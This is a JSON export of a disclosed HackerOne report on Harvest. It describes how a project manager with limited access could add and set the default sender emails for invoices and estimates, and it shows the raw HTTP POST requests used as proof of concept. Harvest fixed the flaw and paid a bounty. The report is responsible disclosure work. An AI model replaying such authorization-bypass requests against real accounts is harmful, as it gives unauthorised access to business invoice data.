{"id":158979,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTg5Nzk=","url":"https://hackerone.com/reports/158979","title":"PM with can Set up email for invoices and estimates (Access control Issue)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-13T05:23:52.255Z","submitted_at":"2016-08-13T05:23:52.255Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":237,"url":"https://hackerone.com/harvest","handle":"harvest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Harvest","twitter_handle":"","website":"http://getharvest.com","about":"Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-29T23:02:59.606Z","bug_reporter_agreed_on_going_public_at":"2016-08-30T23:02:55.056Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nDescription : Project Manager With limited access Invoices and estimates don't have access to Company information. In the company Information there is a option of adding an Email to send invoices and estimations. The limited access Project manager should not be able to Access this sections and shouldn't be able to add the email to send invoices on that.\nBut the Adding Email HTTP request have some access control issues.Hence it let's the Project manager (with limited) to Add new email . \n\nSteps to reproduce : \n1.Create a New account with Owner(UserA) and add a Project manager(Attacker) where he doesn't have access to invoices and addition features.\n2.Open the Project Manager's account and you will see that he's not able to access the Invoice and estimation section where you can change the company info.\n3.Run the Below Mentioned HTTP request  From any proxy tool : \n\nPOST /sender_emails HTTP/1.1\nHost: vijaygangani.harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://vijaygangani.harvestapp.com/invoices/configure\nContent-Length: 287\nCookie: [Cookie_values]\nConnection: keep-alive\n\nutf8=%E2%9C%93\u0026url_hash=thank_you_email\u0026sender_email%5Bname%5D=[Sender's Name]\u0026sender_email%5Bemail%5D=[Email]\u0026authenticity_token=[Token_Value]\u0026x_requested_with=XMLHttpRequest\n\n4.After sending  this Request to server ,It won't check the access and The verification email will be sent to your mentioned email in the HTTP request. \n5. Now Attacker can go to the email and add his email by verifying the email.\n\nNote : The above Mentioned HTTP request can be get by below mentioned link and add email :  https://vijaygangani.harvestapp.com/invoices/configure#company_information_edit\n\n\nImpact :  Any Project Manager with limited access can add his own email to get All the estimation and invoice Details.\n\nLet me know if you need Video POC or any other information regarding this issue.\n\nBest Regards !\nVijay Kumar \n\n\n\n","vulnerability_information_html":"\u003cp\u003eHi Team,\u003c/p\u003e\n\n\u003cp\u003eDescription : Project Manager With limited access Invoices and estimates don\u0026#39;t have access to Company information. In the company Information there is a option of adding an Email to send invoices and estimations. The limited access Project manager should not be able to Access this sections and shouldn\u0026#39;t be able to add the email to send invoices on that.\u003cbr\u003e\nBut the Adding Email HTTP request have some access control issues.Hence it let\u0026#39;s the Project manager (with limited) to Add new email . \u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce : \u003cbr\u003e\n1.Create a New account with Owner(UserA) and add a Project manager(Attacker) where he doesn\u0026#39;t have access to invoices and addition features.\u003cbr\u003e\n2.Open the Project Manager\u0026#39;s account and you will see that he\u0026#39;s not able to access the Invoice and estimation section where you can change the company info.\u003cbr\u003e\n3.Run the Below Mentioned HTTP request  From any proxy tool : \u003c/p\u003e\n\n\u003cp\u003ePOST /sender_emails HTTP/1.1\u003cbr\u003e\nHost: vijaygangani.harvestapp.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\u003cbr\u003e\nAccept: text/javascript, text/html, application/xml, text/xml, \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate, br\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nX-Prototype-Version: 1.7\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\u003cbr\u003e\nReferer: \u003ca title=\"https://vijaygangani.harvestapp.com/invoices/configure\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Finvoices%2Fconfigure\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/invoices/configure\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Length: 287\u003cbr\u003e\nCookie: [Cookie_values]\u003cbr\u003e\nConnection: keep-alive\u003c/p\u003e\n\n\u003cp\u003eutf8=%E2%9C%93\u0026amp;url_hash=thank_you_email\u0026amp;sender_email%5Bname%5D=[Sender\u0026#39;s Name]\u0026amp;sender_email%5Bemail%5D=[Email]\u0026amp;authenticity_token=[Token_Value]\u0026amp;x_requested_with=XMLHttpRequest\u003c/p\u003e\n\n\u003cp\u003e4.After sending  this Request to server ,It won\u0026#39;t check the access and The verification email will be sent to your mentioned email in the HTTP request. \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eNow Attacker can go to the email and add his email by verifying the email.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eNote : The above Mentioned HTTP request can be get by below mentioned link and add email :  \u003ca title=\"https://vijaygangani.harvestapp.com/invoices/configure#company_information_edit\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Finvoices%2Fconfigure%23company_information_edit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/invoices/configure#company_information_edit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eImpact :  Any Project Manager with limited access can add his own email to get All the estimation and invoice Details.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need Video POC or any other information regarding this issue.\u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-29T23:02:55.168Z","allow_singular_disclosure_after":-134026398.48283051,"singular_disclosure_allowed":true,"vote_count":10,"voters":["thisishrsh","dmatrix","dilawer01","vijay_kumar","jens","jbbbkj","sumit7","oldzk34911","nigba","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1141830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jorgeleria : I haven't got any of the response for all the submitted issues. Can you give any ETA for these issues ?","markdown_message":"\u003cp\u003e\u003ca href=\"/jorgeleria\"\u003e@jorgeleria\u003c/a\u003e : I haven\u0026#39;t got any of the response for all the submitted issues. Can you give any ETA for these issues ?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-20T02:44:24.449Z","updated_at":"2016-08-20T02:44:24.449Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1144424,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Vijay,\n\nThanks for your patience! You will get an answer to all your reports during this week.\n\nAs for this one I just verified it, we are going to fix it and we will be awarding a bounty.\nI'll contact you as soon as it is fixed!\n\nBest regards,\nJorge\n","markdown_message":"\u003cp\u003eHi Vijay,\u003c/p\u003e\n\n\u003cp\u003eThanks for your patience! You will get an answer to all your reports during this week.\u003c/p\u003e\n\n\u003cp\u003eAs for this one I just verified it, we are going to fix it and we will be awarding a bounty.\u003cbr\u003e\nI\u0026#39;ll contact you as soon as it is fixed!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-22T11:30:32.303Z","updated_at":"2016-08-22T11:30:32.303Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1145617,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jorgeleria  : Thanks for response. As you said you are merging the  #158982 issue in this. I would like to add one more slimier issue here. Project manager can change the default mail in configurations.\n\nLink : https://vijaygangani.harvestapp.com/estimates/configure\n\nHTTP request : \n\nPOST /sender_emails/make_default/48848 HTTP/1.1\nHost: vijaygangani.harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://vijaygangani.harvestapp.com/estimates/configure\nContent-Length: 143\nCookie: [Cookie_Value]\nConnection: keep-alive\n\nauthenticity_token=\u0026x_requested_with=XMLHttpRequest \n\nKindly Add this Issue in this report and let me know if you need any other help from my side.\n\n\nBest Regards !\nVijay Kumar \n ","markdown_message":"\u003cp\u003e\u003ca href=\"/jorgeleria\"\u003e@jorgeleria\u003c/a\u003e  : Thanks for response. As you said you are merging the  \u003ca href=\"/reports/158982\"\u003e#158982\u003c/a\u003e issue in this. I would like to add one more slimier issue here. Project manager can change the default mail in configurations.\u003c/p\u003e\n\n\u003cp\u003eLink : \u003ca title=\"https://vijaygangani.harvestapp.com/estimates/configure\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Festimates%2Fconfigure\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/estimates/configure\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHTTP request : \u003c/p\u003e\n\n\u003cp\u003ePOST /sender_emails/make_default/48848 HTTP/1.1\u003cbr\u003e\nHost: vijaygangani.harvestapp.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\u003cbr\u003e\nAccept: text/javascript, text/html, application/xml, text/xml, \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate, br\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nX-Prototype-Version: 1.7\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\u003cbr\u003e\nReferer: \u003ca title=\"https://vijaygangani.harvestapp.com/estimates/configure\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Festimates%2Fconfigure\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/estimates/configure\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Length: 143\u003cbr\u003e\nCookie: [Cookie_Value]\u003cbr\u003e\nConnection: keep-alive\u003c/p\u003e\n\n\u003cp\u003eauthenticity_token=\u0026amp;x_requested_with=XMLHttpRequest \u003c/p\u003e\n\n\u003cp\u003eKindly Add this Issue in this report and let me know if you need any other help from my side.\u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-22T19:16:38.073Z","updated_at":"2016-08-22T19:16:38.073Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1159981,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi Vijay,\n\nThis should be fixed!\nCould you check if you are able to reproduce it now?\n\nThanks,\nJorge","markdown_message":"\u003cp\u003eHi Vijay,\u003c/p\u003e\n\n\u003cp\u003eThis should be fixed!\u003cbr\u003e\nCould you check if you are able to reproduce it now?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-29T15:25:53.411Z","updated_at":"2016-08-29T15:25:53.411Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162673,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping make Harvest more secure!","markdown_message":"\u003cp\u003eThanks for helping make Harvest more secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-30T16:51:01.995Z","updated_at":"2016-08-30T16:51:01.995Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"bounty_amount":"250.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"harvest","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163621,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T23:02:55.104Z","updated_at":"2016-08-30T23:02:55.104Z","first_to_agree":true,"actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1223850,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T15:53:20.882Z","updated_at":"2016-09-29T15:53:20.882Z","additional_data":{"old_title":"Project Manager with limited access to company information can Set up Email for invoices and estimates(Access control Issue)","new_title":"PM with can Set up email for invoices and estimates (Access control Issue)"},"actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224814,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T23:02:59.652Z","updated_at":"2016-09-29T23:02:59.652Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}